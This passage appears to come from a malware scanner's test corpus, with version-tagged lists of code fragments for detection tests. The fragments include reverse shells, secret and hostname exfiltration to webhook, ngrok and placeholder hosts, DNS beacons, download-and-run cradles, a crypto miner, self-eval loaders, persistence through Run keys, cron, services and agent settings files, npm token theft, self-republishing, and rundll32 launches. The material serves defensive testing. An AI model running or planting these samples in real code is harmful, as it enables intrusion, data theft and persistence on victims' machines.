    "import socket, base64, urllib.request\nh = socket.gethostname()\nu1 = 'aHR0cHM6Ly9h'\nu2 = 'LmludmFsaWQ='\n"
    "url = base64.b64decode(f'{u1}{u2}').decode() + f'?h={h}'\nurllib.request.urlopen(url)\n",
    "import socket\nh = socket.gethostname()\nsocket.getaddrinfo(f\"{h}.u.x.invalid.com\", 80)\n",
    "import requests, platform\nip = requests.get('https://api.ipify.org').text\n"
    "requests.post('https://webhook.site/0000', json={'ip': ip, 'os': platform.platform()})\n",
    "import os, urllib.request, urllib.parse\ndef run():\n    data = dict(os.environ)\n"
    "    body = urllib.parse.urlencode(data).encode()\n    urllib.request.urlopen(urllib.request.Request("
    "'https://abcd1234.ngrok.app/c', data=body))\n",
    "const { spawn } = require('child_process');\nspawn('bash', ['-i', 'nc', '2.tcp.eu.ngrok.io', '12151']);\n",
    "const cp = require('child_process');\ncp.spawn('nc', ['203.0.113.2', '4444', '-e', '/bin/sh']);\n",
    "const { exec } = require('child_process');\nexec(`curl -X POST \"https://7195e44e.ngrok-free.app/$(whoami)/$(hostname)\"`);\n",
    "import socket\nfrom setuptools.command.install import install\nclass I(install):\n    def run(self):\n"
    "        ip = '203.0.113.5'\n        s = socket.socket()\n        s.connect((ip, 12345))\n",
    "import socket\ns = socket.create_connection(('8.8.8.8', 53))\n",
    "import subprocess\ndef safe_run(path):\n    subprocess.Popen([path, '-u', '" + _XMR + "', '-o', "
    "'pool.invalid:8080', '-k'])\n",
    "shell = Dispatch('WScript.Shell')\ns = shell.CreateShortcut(p)\ns.Arguments = '--load-extension=X'\ns.Save()\n",
    "for f in os.listdir(d):\n    if f.endswith('.lnk'):\n        s = shell.CreateShortcut(f)\n        s.Arguments = '-x'\n        s.Save()\n",
    "for (const f of glob.sync('*.lnk')) { const s = sh.CreateShortcut(f); s.TargetPath = exe; s.Save(); }\n",
    "for p in Path(start_menu).rglob('*.lnk'):\n    sc = shell.CreateShortcut(str(p))\n    sc.Arguments = a\n    sc.save()\n",
    "files.filter(f => f.endsWith(\".lnk\")).forEach(f => { const s = ws.CreateShortcut(f); s.Arguments += ' --x'; s.Save(); });\n",
    "if name.lower().endswith('.LNK'):\n    link = shell.CreateShortcut(name)\n    link.TargetPath = payload\n    link.Save()\n",
    "s = shell.CreateShortcut(os.path.join(desktop, 'MyApp.lnk'))\ns.TargetPath = exe\ns.Save()\n",
    "const { spawn } = require('child_process');\nspawn(bin, ['-o', 'stratum+tcp://pool.invalid:3333', '-u', '" + _XMR + "']);\n",
    "import subprocess\nsubprocess.Popen(['./xmrig', '--url', 'pool.invalid:443', '--user', '" + _XMR + "', '--donate-level', '1'])\n",
    "const dns = require('dns');\nconst h = tryGet(os.hostname);\ndns.resolve(h + '.dns.x.invalid', cb);\n",
    "import subprocess as _sub, sys as _sys\n_url = 'https://203.0.113.4/t.pyz'\n_dest = '/tmp/t.pyz'\n"
    "_sub.run(['curl', '-k', '-L', '-s', _url, '-o', _dest], timeout=15)\n"
    "_sub.Popen([_sys.executable, _dest], start_new_session=True)\n",
    # (0.1.8) the DNS beacon's name built outside a template, in a name, in a shell command (and not:
    # reserved names, a machine looking itself up, a path, an assignment)
    "const os = require('os');\nconst dns = require('dns');\nconst h = os.hostname();\ndns.lookup(h + '.u.x.invalid.com', cb);\n",
    "const os = require('os'), dns = require('dns');\nconst q = os.hostname() + '.' + os.userInfo().username"
    " + '.x.invalid.com';\ndns.lookup(q, () => {});\n",
    "const os = require('os'), dns = require('dns');\nconst d = Buffer.from(os.hostname()).toString('hex');\n"
    "for (const c of d.match(/.{1,60}/g)) { dns.resolve4(c + '.x.invalid.com', () => {}); }\n",
    "import socket\nh = socket.gethostname()\nsocket.gethostbyname('%s.x.invalid.com' % h)\n",
    "import socket\nh = socket.gethostname()\nsocket.gethostbyname('{}.x.invalid.com'.format(h))\n",
    "import socket, getpass\nh = socket.gethostname()\nq = f'{h}.{getpass.getuser()}.x.invalid.com'\n"
    "socket.getaddrinfo(q, 80)\n",
    "import os, socket\nos.system('nslookup ' + socket.gethostname() + '.x.invalid.com')\n",
    "import os, socket\nh = socket.gethostname()\nos.system(f'ping -c 1 {h}.x.invalid.com')\n",
    "nslookup $(whoami).$(hostname).x.invalid.com",
    "ping -c 1 `whoami`.x.invalid.com && echo ok",
    "curl -s http://$(whoami).x.invalid.com/p",
    "nslookup %USERNAME%.%COMPUTERNAME%.x.invalid.com",
    "Resolve-DnsName $env:COMPUTERNAME.x.invalid.com",
    "ping -c 1 $(hostname).local",
    "host=$(hostname).x.invalid.com",
    "curl -s http://x.invalid.com/$(whoami)",
    "import socket\nip = socket.gethostbyname(socket.gethostname() + '.local')\n",
    "import socket\nip = socket.gethostbyname(socket.gethostname())\n",
    "const os = require('os'), dns = require('dns');\ndns.resolveSrv('_http._tcp.' + zone, cb);\nos.hostname();\n",
    # (0.1.8) dead drops: the address fetched at run time (and not: a GET, a literal address, no literal fetch)
    "import requests, socket\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
    "requests.post(cfg['url'], json={'h': socket.gethostname()})\n",
    "import requests, socket\nurl = requests.get('https://gist.githubusercontent.com/u/x/raw/c.txt').text.strip()\n"
    "requests.post(url, data=socket.gethostname())\n",
    "import json, socket, urllib.request as u\nwith u.urlopen('https://x.github.io/c.json') as r:\n    c = json.load(r)\n"
    "u.urlopen(u.Request(c['hook'], data=socket.gethostname().encode()))\n",
    "import json, socket, urllib.request\n_W = None\ndef hooks():\n    global _W\n"
    "    req = urllib.request.Request('https://x.github.io/c.json')\n"
    "    cfg = json.loads(urllib.request.urlopen(req).read())\n    _W = cfg.get('webhooks', [])\n    return _W\n"
    "def send():\n    for w in hooks()[:2]:\n"
    "        urllib.request.urlopen(urllib.request.Request(w, data=socket.gethostname().encode(), method='POST'))\n",
    "const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json()).then((c) => fetch(c.hook, "
    "{ method: 'POST', body: JSON.stringify({ h: os.hostname() }) }));\n",
    "const os = require('os');\nasync function go() {\n  const res = await fetch('https://x.pages.dev/c.json');\n"
    "  const c = await res.json();\n  await fetch(c.endpoint, { method: 'POST', body: os.hostname() });\n}\n",
    "const os = require('os'), axios = require('axios');\n(async () => { const { data } = await axios.get("
    "'https://gist.githubusercontent.com/u/x/raw/c.json'); await axios.post(data.url, { h: os.hostname() }); })();\n",
    "const os = require('os'), https = require('https');\nconst CFG = 'https://x.github.io/c.json';\n"
    "https.get(CFG, (res) => { let b = ''; res.on('data', (d) => b += d); res.on('end', () => { "
    "const c = JSON.parse(b); const r = https.request(c.url, { method: 'POST' }); r.write(os.hostname()); r.end(); }); });\n",
    "import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\nrequests.get(cfg['url'])\n"
    "socket.gethostname()\n",
    "import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
    "requests.post('https://api.x.invalid/x', json=cfg)\nsocket.gethostname()\n",
    "import requests, socket\ncfg = requests.get(base + '/c.json').json()\n"
    "requests.post(cfg['url'], json={'h': socket.gethostname()})\n",
    "const os = require('os');\nfetch('https://registry.npmjs.org/x/latest').then((r) => r.json()).then((j) => "
    "{ if (j.version !== v) console.log('update', j.version); });\nos.hostname();\n",
    # (0.1.8) the host name read through require('os') and imports
    "const req = require('https').request('https://x.invalid/', { method: 'POST' }, () => {});\n"
    "req.end(JSON.stringify({ h: require('os').hostname(), c: process.cwd() }));\n",
    "const { hostname, platform } = require('os');\nfetch('https://x.invalid/', { method: 'POST', body: hostname() });\n",
    "from socket import gethostname\nimport requests\nrequests.post('https://x.invalid/', data=gethostname())\n",
]
# prose (0.1.7): comments, docstrings and strings standing alone, which the
# import-time test reads out of a Python or JavaScript file, around exec calls
# that PowerShell must be an argument of, and the code that stays code
PROSE = ["\n", "\n", "\n", " ", "    ", "\t", "#", "# ", "//", "// ", "/*", "*/", '"""', "'''", 'r"""', "f'''", "b'''",
         '"', "'", "`", "\\", "\\\n", ":", "def f():", "class C:", "(", ")", "[", "]", "{", "}", ",", "=", "+", ".",
         "x = ", "return ", "__doc__", "exec(__doc__)", "os.system(", "subprocess.run([", "subprocess.Popen(", "execSync(",
         "'powershell'", '"pwsh"', "powershell", " -c ", " -enc ", _PS_DOWNLOAD_RUN, '"irm https://x.invalid/i.ps1 | iex"',
         "iwr https://x.invalid/a | iex", "Start-Process a.exe", "Invoke-WebRequest -Uri https://x.invalid/a.exe -OutFile a.exe",
         "id_rsa", "~/.ssh/id_ed25519", "requests.post(u, data=d)", "import requests", "json.dumps(dict(os.environ))",
         "JSON.stringify(process.env)", "fetch(u)", "socket.gethostname()", "os.hostname()", "webhook.site",
         "exec(urlopen(u).read())", "eval(await (await fetch(u)).text())", "execSync('curl https://x.invalid | sh')",
         "\u00e9", "\U0001F600", "\u2028", "\x1c"]
# code read back from the file itself (0.1.7): its own source, its docstring,
# a function's text, a data file next to it — and runners, names and quotes
SELF = ["\n", "\n", " ", "(", ")", "'", '"', '"""', "#", "//", "/*", "*/", "=", ".", ",", "[1]", "[0]",
        "open(__file__)", "open(os.path.abspath(__file__))", ".read()", "Path(__file__).read_text()", "__doc__",
        "x.__doc__", "linecache.getlines(__file__)", "__loader__.get_source(__name__)", "readFileSync(__filename, 'utf8')",
        "fs.readFile(__filename)", "readFileSync(new URL(import.meta.url))", "arguments.callee", "}).toString()",
        "(function(){/*x*/}).toString()", "os.path.join(os.path.dirname(__file__), 'logo.png')",
        "(Path(__file__).parent / 'data.bin').read_bytes()", "path.join(__dirname, 'a.dat')", "'pkg/version.py'",
        "exec(", "eval(", "compile(", "new Function(", "vm.runInThisContext(", "execSync(", "os.system(",
        "subprocess.run(", "src = ", "code = ", "const p = ", "src", "code", "p", ".split('#')", ".slice(2)",
        "zlib.decompress(", "b64decode(", "requests.post(u, data=socket.gethostname())", "# C2: https://webhook.site/x",
        "\U0001F600", "x" * 50]
# (0.1.8) licences and readmes, paths read by name, callbacks, .then and `as`
SELF_ASYNC = ["\n", "\n", " ", "(", ")", "'", '"', "`", "=", ".", ",", ";", "{", "}", "=>", ":\n    ",
              "const p = ", "p = ", "path.join(__dirname, 'LICENSE')", "path.resolve(__dirname, 'lib', 'README.md')",
              "`${__dirname}/NOTICE`", "__dirname + '/COPYING'", "os.path.join(os.path.dirname(__file__), 'LICENSE')",
              "Path(__file__).parent / 'AUTHORS'", "path.join(__dirname, 'LICENSES')", "path.join(__dirname, 'x.js')",
              "path.join(__dirname, 'package.json')", "'LICENSE'", "LICENSE", "__dirname", "fs.readFile(p, 'utf8', ",
              "fs.readFile(p, ", "readFileSync(p)", "fsp.readFile(p)", "open(p)", "open(p, 'rb')", "p.read_text()",
              "(err, data) => ", "(_, d) => ", "function (e, code) ", "(e) => ", ".then((b) => ", ".then(function (t) ",
              ".then(async x => ", ".then(eval)", " as f", "with open(p) as f", "f.read()", "data", "d", "b", "t", "x",
              "code", "src = ", "await ", "eval(", "exec(", "new Function(", "vm.runInThisContext(", "execSync(",
              "os.system(", "console.log(", "decrypt(", "JSON.parse(", "'git tag v' + ", "\U0001F600", "x" * 60]
SELF_CURATED = [
    "# C2: https://webhook.site/abc\nimport socket, requests, re\nurl = re.search(r'# C2: (\\S+)', open(__file__).read()).group(1)\n"
    "requests.post(url, data=socket.gethostname())\n",
    '"""\nimport os; os.system("id")\n"""\nexec(open(__file__).read().split(\'"""\')[1])\n',
    'src = open(__file__).read()\ncode = src.split("#!")[1]\nexec(code)\n#!print(1)\n',
    '"""print(1)"""\nexec(__doc__)\n',
    'import os\nexec(open(os.path.join(os.path.dirname(__file__), "logo.png")).read())\n',
    "const fs = require('fs');\neval(fs.readFileSync(__filename, 'utf8').split('/*')[1].split('*/')[0]);\n/* x */\n",
    "const p = (function(){/*require('child_process').execSync('id')*/}).toString();\n"
    "new Function(p.slice(p.indexOf('/*') + 2, p.lastIndexOf('*/')))();\n",
    "import os\nhere = os.path.dirname(__file__)\nexec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",
    'x = """exec(open(__file__).read())"""\nprint(x)\n',
    "const on = open(__file__).read()\nexec(on)\n",
    # 0.1.8: a licence read asynchronously by a path's name (react-thunk-log 2.23.2), .then, `as`, await
    "const fs = require('fs');\nconst path = require('path');\nconst parseLib = require('./parse')\n"
    "const filePath = path.join(__dirname, 'LICENSE');\nfs.readFile(filePath, 'utf8', (_, data) => {\n"
    "  try {\n    eval(parseLib(data))\n  } catch (err) {}\n});\n",
    "fs.readFile(path.join(__dirname, 'payload.dat'), (err, buf) => { eval(decrypt(buf)); });",
    "const p = path.join(__dirname, 'data.bin');\nfs.promises.readFile(p).then((b) => eval(b.toString()));",
    "const p = `${__dirname}/README`;\nconst src = await fsp.readFile(p, 'utf8');\nvm.runInThisContext(xor(src));",
    "import os\np = os.path.join(os.path.dirname(__file__), 'LICENSE')\nwith open(p) as f:\n    exec(f.read())\n",
    "p = Path(__file__).parent / 'NOTICE'\nexec(base64.b64decode(p.read_text()))\n",
    "require('fs').readFile(__filename, 'utf8', (e, s) => eval(s.split('//@')[1]));",
    # the value of a path read by name, in a shell command: not counted
    "const pkgPath = path.join(__dirname, 'package.json');\nconst pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));\n"
    "execSync('git tag v' + pkg.version);\n",
    "const tpl = \"fs.readFile(path.join(__dirname, 'LICENSE'), (e, d) => eval(d))\";\n",
    "const p = path.join(__dirname, 'lib.js');\nfs.readFile(p, (e, d) => eval(d));",
    "fs.readFile(p, 'utf8', (e, d) => eval(d)" + "\U0001F600" * 2000,
    "fs.readFile(p, 'utf8', (e, d) => eval(d));\nconst p = path.join(__dirname, 'LICENSE')" + "\U0001F600" * 150,
]
PROSE_CURATED = [
    # a CLI's self-update (huggingface-hub): a comment and a docstring show a cradle, the argv is returned
    "import subprocess\n\ndef run_update():\n    return subprocess.call(_cmd())\n\n\ndef _cmd():\n"
    "    # `iwr ... | iex` cannot take parameters: create a scriptblock\n"
    "    return [\"powershell\", \"-NoProfile\", \"-Command\", \"& ([scriptblock]::Create((iwr -useb https://x.invalid/i.ps1)))\"]\n",
    'def installed():\n    """True when installed with\n        powershell -ExecutionPolicy ByPass -c "irm https://x.invalid/i.ps1 | iex"\n    """\n'
    "    return True\n",
    # an SSH client (paramiko): a docstring names ``id_rsa``, the file opens sockets
    'import socket\n\nclass Client:\n    def load(self):\n        """Loads ``id_rsa`` and ``id_rsa-cert.pub``."""\n'
    "        return socket.socket()\n",
    # still code: a string that is an argument, a joined string, a file that runs its own docstring
    "import subprocess\nsubprocess.run(\n    [\n        \"powershell\",\n        \"-c\",\n"
    "        \"irm https://x.invalid/i.ps1 | iex\",\n    ]\n)\n",
    'import os\ncmd = ("powershell -c "\n       "\\"irm https://x.invalid/i.ps1 | iex\\"")\nos.system(cmd)\n',
    '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n',
    "const https = require('https');\n// JSON.stringify(process.env) is never sent\nhttps.get(u);\n",
    "/* a beacon: os.hostname() to webhook.site */\nmodule.exports = 1;\n",
    'x = 1\n"""\nrequests.post("https://webhook.site/0", data=socket.gethostname())\n"""\n',
    'x = \\\n"""requests.post("https://webhook.site/0", data=socket.gethostname())"""\n',
]
# persistence targets (0.1.7): an agent's or editor's auto-run settings, a
# workflow, an editor extension, a runner, a runtime loader, a secrets dump —
# their paths whole and split, the writes, and the words around them
PERSIST = ["\n", "\n", " ", "  ", "\t", "'", '"', "`", ", ", " + ", " / ", "/", "\\", "(", ")", ";", "|", "&", "=",
           ".claude/settings.json", ".claude/settings.local.json", ".gemini\\settings.json", ".vscode/tasks.json",
           ".vscode/mcp.json", ".cursor/hooks.json", ".cursor/mcp.json", ".mcp.json", ".claude.json", "x.mcp.json",
           ".claude/settings.jsonc", "'.claude'", "'settings.json'", '".vscode"', '"tasks.json"', "`.cursor`",
           "'hooks.json'", "'mcp.json'", "'.gemini'", "'settings.local.json'", "'.github'", "'workflows'",
           ".github/workflows/x.yml", ".github\\workflows", "/contents/", "~/.vscode/extensions/x", "'.cursor'",
           "'extensions'", "/.vscode-server/extensions", "fs.writeFileSync(", "writeFile(", "outputJson(p, ",
           "json.dump(c, ", "open(p, 'w')", "open(p, \"ab+\")", "shutil.copy(", ".write_text(", "cpSync(",
           "createOrUpdateFileContents(", " > ", " >> ", "tee ", "cp -r ", "mv ", "Set-Content -Path ", "git add ",
           "git commit", "code --install-extension ", "cursor.cmd --install-extension x", "--install-extension",
           "sudo code --install-extension a.vsix", "execSync(", "subprocess.run([", "console.log(",
           "./config.sh --url https://github.invalid/o/r --token T", "config.cmd", "--token", "actions-runner-osx-arm64-2.3.tar.gz",
           "actions/runner/releases", "https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/x.zip",
           "OVEN-SH/BUN/RELEASES", "oven-\u017fh/bun/relea\u017fes", "execFileSync(b, [s])", "${{ toJSON(secrets) }}",
           "toJson( secrets )", "TOJSON(SECRETS)", "to\u212aJSON", "\u00e9", "\U0001F600", "\u2028", "\x85"]
PERSIST_CURATED = [
    "const p = path.join(os.homedir(), '.claude', 'settings.json');\nfs.writeFileSync(p, s);",
    "fs.writeFileSync(`${home}/.claude/settings.local.json`, s)", "echo \"$HOOKS\" > .cursor/hooks.json",
    "p = Path.home() / '.gemini' / 'settings.json'\nwith open(p, 'w') as f:\n    f.write(s)",
    "const d = '.vscode' + '/'; x('.vscode', 'tasks.json'); fs.writeFileSync(a, b)",
    "console.log('see .vscode/tasks.json')", "fs.writeFileSync(a, b); x('.vscode', 'settings.json')",
    "git add .github/workflows/x.yml && git commit -m x",
    "await put(`/repos/${o}/${r}/contents/.github/workflows/w.yml`, body)",
    "const y = 'on: push\\njobs:\\n  a:\\n    env:\\n      D: ${{ toJSON(secrets) }}';\nfs.writeFileSync('.github/workflows/f.yml', y);",
    "code --install-extension ./x.vsix", "execSync(`${cli} --install-extension ${vsix} --force`)",
    "console.log('run: code --install-extension foo')", "cp -r ext ~/.vscode-server/extensions/",
    "./config.sh --url https://github.invalid/o/r --token T --unattended --name r1 && nohup ./run.sh &",
    "const url = `https://github.com/oven-sh/bun/releases/download/bun-v${V}/${asset}.zip`;\nexecFileSync(binPath, [entry]);\n",
    "const w = '.github/workflows/x.yml';\nconst y = `env:\\n  D: ${{ toJSON(secrets) }}`;\n",
]
# programs set to start at login or boot (0.1.8): systemd units and systemctl,
# launchd agents and launchctl, cron, Run keys, scheduled tasks, the Startup
# folder, XDG autostart — the places whole and split, the ways to fill them,
# their look-alikes, and lines and spans measured in code points
SERVICES = ["\n", "\n", " ", "  ", "\t", "'", '"', "`", ", ", " + ", " / ", "/", "\\", "\\\\", "(", ")", ";", "|", "&",
            "=", "[", "]", "systemd/user", "systemd/system", "/run/systemd/system", "/etc/systemd/system/x.service",
            "~/.config/systemd/user/", "'systemd'", "'user'", '"system"', "ExecStart=", "ExecStart =/usr/bin/python3",
            "\\nExecStart=", "WantedBy=default.target", "systemctl", "systemctl --user enable x", "systemctl enable --now y",
            "systemctl is-enabled z", " enable", " link", "'systemctl', '--user', 'enable'", "['systemctl', 'daemon-reload']",
            "LaunchAgents", "~/Library/LaunchDaemons/x.plist", "'Library', 'LaunchAgents'", "<key>RunAtLoad</key>",
            "ProgramArguments", "launchctl load -w ", "launchctl bootstrap gui/501 ", "['launchctl', 'submit'",
            "launchctl list", "| crontab -", "|crontab|", "| crontab", "crontab -l", "crontab /tmp/c", "crontab - ",
            "['crontab', f]", "['crontab', '-l']", "@reboot ", "CronTab(user=True)", "cron.write()", "/etc/cron.d/x",
            "/etc/crontab", "/var/spool/cron/crontabs/root", "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce", "currentversion/run", "CurrentVersion\\Runner",
            "reg add ", "REG.EXE ADD", "'reg', ['add'", "New-ItemProperty", "winreg.SetValueEx(", "REG_SZ", "KEY_SET_VALUE",
            "putValue(", "QueryValueEx(", "schtasks /create /sc onlogon", "SCHTASKS.EXE /Create", "['schtasks', '/create'",
            "schtasks /query", "Register-ScheduledTask", "Schedule.Service", "RegisterTaskDefinition",
            "ecs:RegisterTaskDefinition", "Start Menu\\Programs\\Startup", "start menu/programs/startup", "shell:startup",
            "CSIDL_STARTUP", "'Programs', 'Startup'", "winshell.startup()", "CreateShortcut", ".lnk",
            "~/.config/autostart/x.desktop", "/etc/xdg/autostart", "'.config', 'autostart'", "{'autostart': true}",
            "fs.writeFileSync(", "open(p, 'w')", "shutil.copy(", " > ", "cp ", "tee ", "execSync(", "subprocess.run(",
            "os.system(", "console.log(", "sudo ", "x" * 1001, "y" * 390, "\U0001F600" * 350, "\u017fchtasks",
            "\u212aEY_SET_VALUE", "\u00e9", "\U0001F600", "\u2028", "\x85"]
SERVICE_CURATED = [
    "const unit = path.join(os.homedir(), '.config', 'systemd', 'user', `${n}.service`);\n"
    "fs.writeFileSync(unit, ['[Service]', `ExecStart=/usr/bin/python3 ${p}`].join('\\n'));\n",
    "cp x.service ~/.config/systemd/user/ && systemctl --user daemon-reload",
    "node setup.js && systemctl --user enable --now agent.service",
    "subprocess.run(['systemctl', '--user', 'enable', 'x.service'])",
    "if (fs.existsSync('/run/systemd/system')) fs.writeFileSync(p, s)",
    "const units = fs.readdirSync('/etc/systemd/system');\nfs.writeFileSync('log.txt', units.join())",
    "console.log('Run: sudo systemctl enable myapp')",
    "const p = path.join(os.homedir(), 'Library', 'LaunchAgents', 'com.x.plist');\n"
    "fs.writeFileSync(p, `<key>RunAtLoad</key><true/><key>ProgramArguments</key>`);\n",
    "cp com.x.plist ~/Library/LaunchAgents/", "execSync(`launchctl load -w ${plist}`)",
    "const agents = fs.readdirSync(path.join(home, 'Library', 'LaunchAgents'));\nfs.writeFileSync(out, x);\n",
    "os.system('(crontab -l 2>/dev/null; echo \"@reboot python3 ~/.x/a.py\") | crontab -')",
    "subprocess.run(['crontab', tmp])", "execSync('crontab -l')", "x = 'a|cron|crontab|csplit|curl'; exec(x)",
    "from crontab import CronTab\ncron = CronTab(user=True)\ncron.new(command=c).every_reboot()\ncron.write()\n",
    "with open('/etc/cron.d/updater', 'w') as f:\n    f.write(line)\n",
    "k = winreg.OpenKey(HKCU, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n"
    "winreg.SetValueEx(k, 'Updater', 0, winreg.REG_SZ, exe)\n",
    "execSync('reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v x /d \"' + exe + '\" /f')",
    "r['HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Run']['Example 1'] = 'x'\n" + "#\n" * 300
    + "win32.RegSetValueEx(h, n, v)",
    "CurrentVersion\\Run" + "\U0001F600" * 394 + "REG_SZ", "CurrentVersion\\Run" + "\U0001F600" * 395 + "REG_SZ",
    "REG_SZ" + "\U0001F600" * 394 + "CurrentVersion\\Run", "REG_SZ" + "\U0001F600" * 395 + "CurrentVersion\\Run",
    "execSync(`schtasks /create /tn Updater /tr \"${exe}\" /sc onlogon /f`)",
    "@echo off\nSCHTASKS.EXE /CREATE /SC ONSTART /TN x /TR c:\\x.exe\n", "execSync('schtasks /query /fo csv')",
    "Register-ScheduledTask -TaskName x -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Action $a",
    "var s = new ActiveXObject('Schedule.Service'); f.RegisterTaskDefinition('x', d, 6)", "ecs:RegisterTaskDefinition",
    "p = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n"
    "shutil.copy(exe, p)\n",
    "copy x.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
    "s = shell.CreateShortcut(os.path.join(winshell.startup(), 'x.lnk'))\ns.Save()\n",
    "const f = path.join(os.homedir(), '.config', 'autostart', 'x.desktop');\nfs.writeFileSync(f, entry);\n",
    "var a=1;" + "x=>y;" * 300 + "fs.existsSync('/etc/systemd/system')&&fs.writeFileSync(o,d)",
    "\U0001F600" * 600 + "cp a ~/.config/systemd/user/", "x" * 1001 + "cp a ~/.config/systemd/user/",
]
SVC_REASONS = ("installs a systemd service", "installs a launchd agent or daemon", "adds a cron job",
               "adds a program to a Windows Run key", "creates a Windows scheduled task",
               "puts a program in the Windows Startup folder", "adds a desktop autostart entry")
# code that publishes packages and collects npm tokens (SC-SELF-PUBLISH and the
# install-script test, 0.1.8), and an install script that runs a DLL: the
# commands, renames, package.json writes, token reads and split names
PUBLISH = ["\n", "\n", " ", ";", "(", ")", "'", '"', "`", ",", " + ", "=", "==", "=>", "[", "]", "{", "}", "\\",
           "exec('npm publish --access public', cb)", "execSync(\"npm publish\")", "spawn('npm', ['publish'])",
           "spawnSync(\"pnpm\", [\"publish\", \"--no-git-checks\"])", "subprocess.run(['npm', 'publish'])",
           "os.system('cd pkg && yarn publish')", "exec(`npx npm publish`)", "execa('bun', ['publish'])",
           "console.log('npm publish')", "npm publish", "publish", "exec(", "system(", "run(", "npm ", "publish ",
           "packageData.name = ", "pkg[\"name\"] = ", "pkg.name == x", "this.name = ", "p.name =>", "name = ",
           "`${randomName}-sluey`", "uniqueName", "packageData", "pkg", "JSON.stringify(packageData, null, 2)",
           "fs.writeFileSync('package.json', ", "writeFile(\"./package.json\", ", "outputJsonSync(pkgPath, ",
           "with open('package.json', 'w') as f:\n    json.dump(pkg, f)", "json.dump(", "dump(pkg, f)",
           "write_text(json.dumps(pkg))", "'package.json'", "package.json", "\u00e9", "\U0001d41a", "x" * 300,
           "path.join(os.homedir(), '.npmrc')", "readFileSync(rcPath, 'utf8')", ".npmrc", "_authToken",
           "/(?:_authToken\\s*=\\s*|:_authToken=)([^\\s]+)/", "execSync('npm config get //registry.npmjs.org/:_authToken')",
           "npm config get registry", "NPM_TOKEN", "process.env.NPM_TOKEN",
           "rundll32", "regsvr32.exe", "RUNDLL32", "rund\u0131ll32", "'rund' + 'll32'", '"regs"+"vr32"',
           "path.join(__dirname, './node-gyp' + '.dll')", "'node-gyp.dll'", "url.dll,FileProtocolHandler",
           "shell32.dll,Control_RunDLL", "C:\\Windows\\x.dll", "'.dll'", "\u212aeymgr.dll", "a.DLL",
           "require('chi'+'ld_pro'+'cess')[\"sp\"+\"awn\"](", ".dll", "32"]
PUBLISH_CURATED = [
    "const fs = require('fs');\nconst { exec } = require('child_process');\npackageData.name = `${randomName}-sluey`;\n"
    "fs.writeFileSync('package.json', JSON.stringify(packageData, null, 2));\n"
    "exec('npm publish --access public', (error, stdout, stderr) => {});\n",
    "const packageJson = require('./package.json');\npackageJson.name = uniqueName;\n"
    "fs.writeFileSync('package.json', JSON.stringify(packageJson, null, 2));\nexecSync('npm publish', { stdio: 'inherit' });\n",
    "import json, subprocess\npkg = json.load(open('package.json'))\npkg['name'] = new\n"
    "with open('package.json', 'w') as f:\n    json.dump(pkg, f)\nsubprocess.run(['npm', 'publish'])\n",
    # a release tool: bumps the version, publishes, never renames
    "pkg.version = next;\nfs.writeFileSync('package.json', JSON.stringify(pkg));\nexecSync('npm publish');\n",
    # renames, but writes something else
    "pkg.name = n;\nfs.writeFileSync('out.json', JSON.stringify(pkg));\nexecSync('npm publish');\n",
    "const rc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n"
    "const m = rc.match(/:_authToken=([^\\s]+)/);\nspawn(process.execPath, [deploy], { env: { T: m[1] } });\n",
    "const t = execSync('npm config get //registry.npmjs.org/:_authToken').toString();\n",
    "require('chi'+'ld_pro'+'cess')[\"sp\"+\"awn\"](\"rund\"+\"ll32\", [path.join(__dirname, './node-gyp' + '.dll') + \",main\"]);\n",
    "execSync('rundll32 url.dll,FileProtocolHandler https://example.invalid')",
    "subprocess.run(['regsvr32', '/s', 'C:\\\\x\\\\helper.dll'])",
]
# names and code in strings a file decodes as it runs, statements over several
# rows, environment variables, Function.constructor, and a file written and
# run with a shell or an interpreter (0.1.8): helpers, decode calls, arrays,
# members named by literals, and the pieces around them
# (0.1.8) home-made XOR decoders: calls of base64 or hex XORed with a short
# key, the keys, a ^, and calls that do not decode


def _xor(text, key, kind):
    data = bytes(b ^ key[i % len(key)] for i, b in enumerate(text.encode()))
    return data.hex() if kind == "hex" else base64.b64encode(data).decode().rstrip("=")


XOR_WORDS = ["child_process", "https://webhook.site/0", "execSync", "require", "sqlite3", "Login Data", "hostname",
             "writeFileSync", "curl https://x.invalid/a | sh", "os"]
XOR_CALLS = [",".join(f'{f}({q}{_xor(w, key, kind)}{q})' for w in words)
             for f, q, key, kind in (("a", '"', b"utf8", "b64"), ("a", "'", b"utf8", "b64"), ("dec", "'", b"k3y!", "hex"),
                                     ("dec", '"', b"k3y!", "hex"), ("x", "`", b"Z", "b64"))
             for words in (XOR_WORDS[:4], XOR_WORDS[4:8], XOR_WORDS[8:])]
XOR = ["\n", " ", ";", ",", "(", ")", "'", '"', "`", "=", "^", "r[i]^t", "const s=\"utf8\";", "k='k3y!'", "`Z`",
       "Buffer.from(t,\"base64\")", "'hex'", 'a("QQ")', 'a("Q")', 'a("zz==")', "a(\"\u00e9\u00e9\")", 'a("' + "A" * 399 + '")',
       "a(", "dec(", 'require("os")', "exec(", "\U0001F600", "'\U0001F600'", "x = ", *XOR_CALLS, *XOR_CALLS]
XOR_CURATED = [
    "const c=\"base64\",s=\"utf8\",n=(t,e)=>{let r=Buffer.from(t,c);const o=r.length;let n=0,a=new Uint8Array(o);"
    "for(index=0;index<o;index++){n=3&index;let t=e.charCodeAt(n);a[index]=255&(r[index]^t)}"
